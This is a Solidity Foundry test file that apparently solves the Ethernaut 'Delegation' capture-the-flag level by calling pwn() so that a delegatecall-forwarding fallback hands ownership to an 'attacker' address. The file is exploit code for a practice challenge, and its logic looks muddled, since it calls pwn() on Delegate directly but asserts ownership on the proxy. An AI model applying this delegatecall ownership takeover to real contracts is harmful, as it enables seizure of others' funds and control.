// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Delegation.sol";

contract DelegationTest is Test{
    Delegate del;
    Delegation delegatinAddr;

    address attacker = mkaddr("attacker");
    address owner = mkaddr("owner");
    

    function setUp() public {
        del = new Delegate(owner);
        //delegatinAddr = Delegation(del);
    }

    function testDelegate() public {
        vm.startPrank(attacker);
        Delegating gating = new Delegating(del);
        gating.owner();
        // trigger the level's fallback function to solve the challenge
        (bool success, ) = address(del).call(abi.encodeWithSignature("pwn()"));
         require(success, "call not successful");
        // Check that the player is the new owner of the level
         assertEq(gating.owner(), attacker);
         vm.stopPrank();
        

    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }


}

contract Delegating is Test{
    Delegate _delegate;
    address public owner = mkaddr("owner");

    constructor(Delegate _delegateAddress) {
    _delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(_delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }

   function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }

}